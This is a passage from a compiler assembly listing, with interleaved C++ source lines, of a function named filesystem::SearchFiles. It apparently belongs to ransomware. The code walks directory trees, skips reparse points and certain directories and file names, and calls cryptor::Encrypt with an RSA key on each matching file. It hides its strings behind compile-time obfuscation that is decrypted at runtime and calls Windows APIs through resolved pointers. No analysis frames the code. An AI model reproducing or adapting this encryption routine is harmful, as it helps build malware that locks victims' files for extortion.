  001e7	e8 00 00 00 00	 call	 ?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
  001ec	48 89 85 e8 0e
	00 00		 mov	 QWORD PTR tv155[rbp], rax
  001f3	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1HC@LEGLMILJ@?$AAF?$AAi?$AAn?$AAd?$AAF?$AAi?$AAr?$AAs?$AAt?$AAF?$AAi?$AAl?$AAe?$AA?5?$AAf@
  001fa	48 8d 8d 40 0c
	00 00		 lea	 rcx, QWORD PTR $T24[rbp]
  00201	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >
  00206	48 8b c8	 mov	 rcx, rax
  00209	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAAPEBDXZ ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::decrypt
  0020e	8b 8d e4 0e 00
	00		 mov	 ecx, DWORD PTR tv152[rbp]
  00214	44 8b c1	 mov	 r8d, ecx
  00217	48 8b 8d e8 0e
	00 00		 mov	 rcx, QWORD PTR tv155[rbp]
  0021e	48 8b d1	 mov	 rdx, rcx
  00221	48 8b c8	 mov	 rcx, rax
  00224	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write
$LN12@SearchFile:

; 190  : 			TAILQ_REMOVE(&DirectoryList, DirectoryInfo, Entries);

  00229	48 8b 85 c8 02
	00 00		 mov	 rax, QWORD PTR DirectoryInfo$11[rbp]
  00230	48 83 78 20 00	 cmp	 QWORD PTR [rax+32], 0
  00235	74 1c		 je	 SHORT $LN25@SearchFile
  00237	48 8b 85 c8 02
	00 00		 mov	 rax, QWORD PTR DirectoryInfo$11[rbp]
  0023e	48 8b 40 20	 mov	 rax, QWORD PTR [rax+32]
  00242	48 8b 8d c8 02
	00 00		 mov	 rcx, QWORD PTR DirectoryInfo$11[rbp]
  00249	48 8b 49 28	 mov	 rcx, QWORD PTR [rcx+40]
  0024d	48 89 48 28	 mov	 QWORD PTR [rax+40], rcx
  00251	eb 0f		 jmp	 SHORT $LN26@SearchFile
$LN25@SearchFile:
  00253	48 8b 85 c8 02
	00 00		 mov	 rax, QWORD PTR DirectoryInfo$11[rbp]
  0025a	48 8b 40 28	 mov	 rax, QWORD PTR [rax+40]
  0025e	48 89 45 10	 mov	 QWORD PTR DirectoryList$[rbp+8], rax
$LN26@SearchFile:
  00262	48 8b 85 c8 02
	00 00		 mov	 rax, QWORD PTR DirectoryInfo$11[rbp]
  00269	48 8b 40 28	 mov	 rax, QWORD PTR [rax+40]
  0026d	48 8b 8d c8 02
	00 00		 mov	 rcx, QWORD PTR DirectoryInfo$11[rbp]
  00274	48 8b 49 20	 mov	 rcx, QWORD PTR [rcx+32]
  00278	48 89 08	 mov	 QWORD PTR [rax], rcx
  0027b	33 c0		 xor	 eax, eax
  0027d	85 c0		 test	 eax, eax
  0027f	75 a8		 jne	 SHORT $LN12@SearchFile

; 191  : 			delete DirectoryInfo;

  00281	48 8b 85 c8 02
	00 00		 mov	 rax, QWORD PTR DirectoryInfo$11[rbp]
  00288	48 89 85 d8 0c
	00 00		 mov	 QWORD PTR $T25[rbp], rax
  0028f	48 83 bd d8 0c
	00 00 00	 cmp	 QWORD PTR $T25[rbp], 0
  00297	74 1a		 je	 SHORT $LN37@SearchFile
  00299	ba 01 00 00 00	 mov	 edx, 1
  0029e	48 8b 8d d8 0c
	00 00		 mov	 rcx, QWORD PTR $T25[rbp]
  002a5	e8 00 00 00 00	 call	 ??_Gdirectory_info_@@QEAAPEAXI@Z
  002aa	48 89 85 e8 0e
	00 00		 mov	 QWORD PTR tv184[rbp], rax
  002b1	eb 0b		 jmp	 SHORT $LN38@SearchFile
$LN37@SearchFile:
  002b3	48 c7 85 e8 0e
	00 00 00 00 00
	00		 mov	 QWORD PTR tv184[rbp], 0
$LN38@SearchFile:

; 192  : 			continue;

  002be	48 8d 8d 28 03
	00 00		 lea	 rcx, QWORD PTR SearchMask$13[rbp]
  002c5	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  002ca	48 8d 8d e8 02
	00 00		 lea	 rcx, QWORD PTR CurrentDirectory$12[rbp]
  002d1	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  002d6	e9 39 fe ff ff	 jmp	 $LN8@SearchFile
$LN15@SearchFile:

; 193  : 
; 194  : 		}
; 195  : 
; 196  : 		do {
; 197  : 
; 198  : 			if (!plstrcmpW(FindData.cFileName, OBFW(L".")) ||
; 199  : 				!plstrcmpW(FindData.cFileName, OBFW(L"..")) ||

  002db	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_13JOFGPIOO@?$AA?4@
  002e2	48 8d 8d f4 0c
	00 00		 lea	 rcx, QWORD PTR $T26[rbp]
  002e9	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >
  002ee	48 8b c8	 mov	 rcx, rax
  002f1	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
  002f6	48 8b d0	 mov	 rdx, rax
  002f9	48 8d 8d 8c 00
	00 00		 lea	 rcx, QWORD PTR FindData$10[rbp+44]
  00300	e8 00 00 00 00	 call	 ?plstrcmpW@@YAHPEB_W0@Z	; plstrcmpW
  00305	85 c0		 test	 eax, eax
  00307	74 3a		 je	 SHORT $LN28@SearchFile
  00309	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_15DDHGOCBH@?$AA?4?$AA?4@
  00310	48 8d 8d 14 0d
	00 00		 lea	 rcx, QWORD PTR $T27[rbp]
  00317	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
  0031c	48 8b c8	 mov	 rcx, rax
  0031f	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
  00324	48 8b d0	 mov	 rdx, rax
  00327	48 8d 8d 8c 00
	00 00		 lea	 rcx, QWORD PTR FindData$10[rbp+44]
  0032e	e8 00 00 00 00	 call	 ?plstrcmpW@@YAHPEB_W0@Z	; plstrcmpW
  00333	85 c0		 test	 eax, eax
  00335	74 0c		 je	 SHORT $LN28@SearchFile
  00337	8b 45 60	 mov	 eax, DWORD PTR FindData$10[rbp]
  0033a	25 00 04 00 00	 and	 eax, 1024		; 00000400H
  0033f	85 c0		 test	 eax, eax
  00341	74 05		 je	 SHORT $LN27@SearchFile
$LN28@SearchFile:

; 200  : 				FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
; 201  : 			{
; 202  : 				continue;

  00343	e9 fc 01 00 00	 jmp	 $LN13@SearchFile
$LN27@SearchFile:

; 203  : 			}
; 204  : 
; 205  : 			if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&

  00348	8b 45 60	 mov	 eax, DWORD PTR FindData$10[rbp]
  0034b	83 e0 10	 and	 eax, 16
  0034e	85 c0		 test	 eax, eax
  00350	0f 84 27 01 00
	00		 je	 $LN29@SearchFile
  00356	48 8d 8d 8c 00
	00 00		 lea	 rcx, QWORD PTR FindData$10[rbp+44]
  0035d	e8 00 00 00 00	 call	 ?CheckDirectory@@YAHPEB_W@Z ; CheckDirectory
  00362	85 c0		 test	 eax, eax
  00364	0f 84 13 01 00
	00		 je	 $LN29@SearchFile

; 206  : 				CheckDirectory(FindData.cFileName))
; 207  : 			{
; 208  : 
; 209  : 				std::wstring Directory = MakePath(CurrentDirectory, FindData.cFileName);

  0036a	48 8d 85 38 0d
	00 00		 lea	 rax, QWORD PTR $T28[rbp]
  00371	48 89 85 78 0d
	00 00		 mov	 QWORD PTR $T29[rbp], rax
  00378	48 8d 85 98 0d
	00 00		 lea	 rax, QWORD PTR $T30[rbp]
  0037f	48 89 85 d8 0d
	00 00		 mov	 QWORD PTR $T31[rbp], rax
  00386	48 8d 95 8c 00
	00 00		 lea	 rdx, QWORD PTR FindData$10[rbp+44]
  0038d	48 8b 8d 78 0d
	00 00		 mov	 rcx, QWORD PTR $T29[rbp]
  00394	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00399	48 89 85 e8 0e
	00 00		 mov	 QWORD PTR tv214[rbp], rax
  003a0	48 8d 95 e8 02
	00 00		 lea	 rdx, QWORD PTR CurrentDirectory$12[rbp]
  003a7	48 8b 8d d8 0d
	00 00		 mov	 rcx, QWORD PTR $T31[rbp]
  003ae	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  003b3	48 8b 8d e8 0e
	00 00		 mov	 rcx, QWORD PTR tv214[rbp]
  003ba	4c 8b c1	 mov	 r8, rcx
  003bd	48 8b d0	 mov	 rdx, rax
  003c0	48 8d 8d 88 03
	00 00		 lea	 rcx, QWORD PTR Directory$15[rbp]
  003c7	e8 00 00 00 00	 call	 ?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z ; MakePath

; 210  : 				PDIRECTORY_INFO DirectoryInfo = new DIRECTORY_INFO;

  003cc	b9 30 00 00 00	 mov	 ecx, 48			; 00000030H
  003d1	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  003d6	48 89 85 f8 0d
	00 00		 mov	 QWORD PTR $T32[rbp], rax
  003dd	48 83 bd f8 0d
	00 00 00	 cmp	 QWORD PTR $T32[rbp], 0
  003e5	74 15		 je	 SHORT $LN39@SearchFile
  003e7	48 8b 8d f8 0d
	00 00		 mov	 rcx, QWORD PTR $T32[rbp]
  003ee	e8 00 00 00 00	 call	 ??0directory_info_@@QEAA@XZ
  003f3	48 89 85 e8 0e
	00 00		 mov	 QWORD PTR tv239[rbp], rax
  003fa	eb 0b		 jmp	 SHORT $LN40@SearchFile
$LN39@SearchFile:
  003fc	48 c7 85 e8 0e
	00 00 00 00 00
	00		 mov	 QWORD PTR tv239[rbp], 0
$LN40@SearchFile:
  00407	48 8b 85 e8 0e
	00 00		 mov	 rax, QWORD PTR tv239[rbp]
  0040e	48 89 85 c8 03
	00 00		 mov	 QWORD PTR DirectoryInfo$16[rbp], rax

; 211  : 				DirectoryInfo->Directory = Directory;

  00415	48 8b 85 c8 03
	00 00		 mov	 rax, QWORD PTR DirectoryInfo$16[rbp]
  0041c	48 8d 95 88 03
	00 00		 lea	 rdx, QWORD PTR Directory$15[rbp]
  00423	48 8b c8	 mov	 rcx, rax
  00426	e8 00 00 00 00	 call	 ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
$LN18@SearchFile:

; 212  : 				TAILQ_INSERT_TAIL(&DirectoryList, DirectoryInfo, Entries);

  0042b	48 8b 85 c8 03
	00 00		 mov	 rax, QWORD PTR DirectoryInfo$16[rbp]
  00432	48 c7 40 20 00
	00 00 00	 mov	 QWORD PTR [rax+32], 0
  0043a	48 8b 85 c8 03
	00 00		 mov	 rax, QWORD PTR DirectoryInfo$16[rbp]
  00441	48 8b 4d 10	 mov	 rcx, QWORD PTR DirectoryList$[rbp+8]
  00445	48 89 48 28	 mov	 QWORD PTR [rax+40], rcx
  00449	48 8b 45 10	 mov	 rax, QWORD PTR DirectoryList$[rbp+8]
  0044d	48 8b 8d c8 03
	00 00		 mov	 rcx, QWORD PTR DirectoryInfo$16[rbp]
  00454	48 89 08	 mov	 QWORD PTR [rax], rcx
  00457	48 8b 85 c8 03
	00 00		 mov	 rax, QWORD PTR DirectoryInfo$16[rbp]
  0045e	48 83 c0 20	 add	 rax, 32			; 00000020H
  00462	48 89 45 10	 mov	 QWORD PTR DirectoryList$[rbp+8], rax
  00466	33 c0		 xor	 eax, eax
  00468	85 c0		 test	 eax, eax
  0046a	75 bf		 jne	 SHORT $LN18@SearchFile

; 213  : 
; 214  : 			}

  0046c	48 8d 8d 88 03
	00 00		 lea	 rcx, QWORD PTR Directory$15[rbp]
  00473	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00478	e9 c7 00 00 00	 jmp	 $LN13@SearchFile
$LN29@SearchFile:

; 215  : 			else if (CheckFilename(FindData.cFileName)) {

  0047d	48 8d 8d 8c 00
	00 00		 lea	 rcx, QWORD PTR FindData$10[rbp+44]
  00484	e8 00 00 00 00	 call	 ?CheckFilename@@YAHPEB_W@Z ; CheckFilename
  00489	85 c0		 test	 eax, eax
  0048b	0f 84 b3 00 00
	00		 je	 $LN13@SearchFile

; 216  : 
; 217  : 				std::wstring Filename = MakePath(CurrentDirectory, FindData.cFileName);

  00491	48 8d 85 18 0e
	00 00		 lea	 rax, QWORD PTR $T33[rbp]
  00498	48 89 85 58 0e
	00 00		 mov	 QWORD PTR $T34[rbp], rax
  0049f	48 8d 85 78 0e
	00 00		 lea	 rax, QWORD PTR $T35[rbp]
  004a6	48 89 85 b8 0e
	00 00		 mov	 QWORD PTR $T36[rbp], rax
  004ad	48 8d 95 8c 00
	00 00		 lea	 rdx, QWORD PTR FindData$10[rbp+44]
  004b4	48 8b 8d 58 0e
	00 00		 mov	 rcx, QWORD PTR $T34[rbp]
  004bb	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  004c0	48 89 85 e8 0e
	00 00		 mov	 QWORD PTR tv289[rbp], rax
  004c7	48 8d 95 e8 02
	00 00		 lea	 rdx, QWORD PTR CurrentDirectory$12[rbp]
  004ce	48 8b 8d b8 0e
	00 00		 mov	 rcx, QWORD PTR $T36[rbp]
  004d5	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  004da	48 8b 8d e8 0e
	00 00		 mov	 rcx, QWORD PTR tv289[rbp]
  004e1	4c 8b c1	 mov	 r8, rcx
  004e4	48 8b d0	 mov	 rdx, rax
  004e7	48 8d 8d e8 03
	00 00		 lea	 rcx, QWORD PTR Filename$17[rbp]
  004ee	e8 00 00 00 00	 call	 ?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z ; MakePath

; 218  : 				cryptor::FILE_INFO FileInfo;
; 219  : 				RtlSecureZeroMemory(&FileInfo, sizeof(FileInfo));

  004f3	ba 90 02 00 00	 mov	 edx, 656		; 00000290H
  004f8	48 8d 8d 30 04
	00 00		 lea	 rcx, QWORD PTR FileInfo$18[rbp]
  004ff	e8 00 00 00 00	 call	 RtlSecureZeroMemory

; 220  : 				FileInfo.Filename = Filename.c_str();

  00504	48 8d 8d e8 03
	00 00		 lea	 rcx, QWORD PTR Filename$17[rbp]
  0050b	e8 00 00 00 00	 call	 ?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
  00510	48 89 85 30 04
	00 00		 mov	 QWORD PTR FileInfo$18[rbp], rax

; 221  : 				cryptor::Encrypt(&FileInfo, Buffer, CryptoProvider, RsaKey);

  00517	4c 8b 8d 30 0f
	00 00		 mov	 r9, QWORD PTR RsaKey$[rbp]
  0051e	4c 8b 85 28 0f
	00 00		 mov	 r8, QWORD PTR CryptoProvider$[rbp]
  00525	48 8b 95 38 0f
	00 00		 mov	 rdx, QWORD PTR Buffer$[rbp]
  0052c	48 8d 8d 30 04
	00 00		 lea	 rcx, QWORD PTR FileInfo$18[rbp]
  00533	e8 00 00 00 00	 call	 ?Encrypt@cryptor@@YAHPEAUfile_info@1@PEAE_K2@Z ; cryptor::Encrypt

; 222  : 
; 223  : 			}

  00538	48 8d 8d e8 03
	00 00		 lea	 rcx, QWORD PTR Filename$17[rbp]
  0053f	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
$LN13@SearchFile:

; 224  : 
; 225  : 
; 226  : 		} while (pFindNextFileW(hSearchFile, &FindData));

  00544	48 8d 55 60	 lea	 rdx, QWORD PTR FindData$10[rbp]
  00548	48 8b 8d 68 03
	00 00		 mov	 rcx, QWORD PTR hSearchFile$14[rbp]
  0054f	e8 00 00 00 00	 call	 ?pFindNextFileW@@YAHPEAXPEAU_WIN32_FIND_DATAW@@@Z ; pFindNextFileW
  00554	85 c0		 test	 eax, eax
  00556	0f 85 7f fd ff
	ff		 jne	 $LN15@SearchFile
$LN21@SearchFile:

; 227  : 
; 228  : 		TAILQ_REMOVE(&DirectoryList, DirectoryInfo, Entries);

  0055c	48 8b 85 c8 02
	00 00		 mov	 rax, QWORD PTR DirectoryInfo$11[rbp]
  00563	48 83 78 20 00	 cmp	 QWORD PTR [rax+32], 0
  00568	74 1c		 je	 SHORT $LN32@SearchFile
  0056a	48 8b 85 c8 02
	00 00		 mov	 rax, QWORD PTR DirectoryInfo$11[rbp]
  00571	48 8b 40 20	 mov	 rax, QWORD PTR [rax+32]
  00575	48 8b 8d c8 02
	00 00		 mov	 rcx, QWORD PTR DirectoryInfo$11[rbp]
  0057c	48 8b 49 28	 mov	 rcx, QWORD PTR [rcx+40]
  00580	48 89 48 28	 mov	 QWORD PTR [rax+40], rcx
  00584	eb 0f		 jmp	 SHORT $LN33@SearchFile
$LN32@SearchFile:
  00586	48 8b 85 c8 02
	00 00		 mov	 rax, QWORD PTR DirectoryInfo$11[rbp]
  0058d	48 8b 40 28	 mov	 rax, QWORD PTR [rax+40]
  00591	48 89 45 10	 mov	 QWORD PTR DirectoryList$[rbp+8], rax
$LN33@SearchFile:
  00595	48 8b 85 c8 02
	00 00		 mov	 rax, QWORD PTR DirectoryInfo$11[rbp]
  0059c	48 8b 40 28	 mov	 rax, QWORD PTR [rax+40]
  005a0	48 8b 8d c8 02
	00 00		 mov	 rcx, QWORD PTR DirectoryInfo$11[rbp]
  005a7	48 8b 49 20	 mov	 rcx, QWORD PTR [rcx+32]
  005ab	48 89 08	 mov	 QWORD PTR [rax], rcx
  005ae	33 c0		 xor	 eax, eax
  005b0	85 c0		 test	 eax, eax
  005b2	75 a8		 jne	 SHORT $LN21@SearchFile

; 229  : 		delete DirectoryInfo;

  005b4	48 8b 85 c8 02
	00 00		 mov	 rax, QWORD PTR DirectoryInfo$11[rbp]
  005bb	48 89 85 d8 0e
	00 00		 mov	 QWORD PTR $T37[rbp], rax
  005c2	48 83 bd d8 0e
	00 00 00	 cmp	 QWORD PTR $T37[rbp], 0
  005ca	74 1a		 je	 SHORT $LN41@SearchFile
  005cc	ba 01 00 00 00	 mov	 edx, 1
  005d1	48 8b 8d d8 0e
	00 00		 mov	 rcx, QWORD PTR $T37[rbp]
  005d8	e8 00 00 00 00	 call	 ??_Gdirectory_info_@@QEAAPEAXI@Z
  005dd	48 89 85 e8 0e
	00 00		 mov	 QWORD PTR tv339[rbp], rax
  005e4	eb 0b		 jmp	 SHORT $LN42@SearchFile
$LN41@SearchFile:
  005e6	48 c7 85 e8 0e
	00 00 00 00 00
	00		 mov	 QWORD PTR tv339[rbp], 0
$LN42@SearchFile:

; 230  : 		pFindClose(hSearchFile);

  005f1	48 8b 8d 68 03
	00 00		 mov	 rcx, QWORD PTR hSearchFile$14[rbp]
  005f8	e8 00 00 00 00	 call	 ?pFindClose@@YAHPEAX@Z	; pFindClose

; 231  : 
; 232  : 	}

  005fd	48 8d 8d 28 03
	00 00		 lea	 rcx, QWORD PTR SearchMask$13[rbp]
  00604	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00609	48 8d 8d e8 02
	00 00		 lea	 rcx, QWORD PTR CurrentDirectory$12[rbp]
  00610	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00615	e9 fa fa ff ff	 jmp	 $LN8@SearchFile
$LN9@SearchFile:

; 233  : }

  0061a	48 8b 8d 20 0f
	00 00		 mov	 rcx, QWORD PTR StartDirectory$[rbp]
  00621	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
$LN1@SearchFile:
  00626	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  0062a	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z$rtcFrameData
  00631	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  00636	48 8b 8d f0 0e
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  0063d	48 33 cd	 xor	 rcx, rbp
  00640	e8 00 00 00 00	 call	 __security_check_cookie
  00645	48 8d a5 08 0f
	00 00		 lea	 rsp, QWORD PTR [rbp+3848]
  0064c	5f		 pop	 rdi
  0064d	5d		 pop	 rbp
  0064e	c3		 ret	 0
?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z ENDP ; filesystem::SearchFiles
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0001a	48 8b c8	 mov	 rcx, rax
  0001d	e8 00 00 00 00	 call	 ??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
  00022	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00029	5f		 pop	 rdi
  0002a	5d		 pop	 rbp
  0002b	c3		 ret	 0
??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>
_TEXT	ENDS
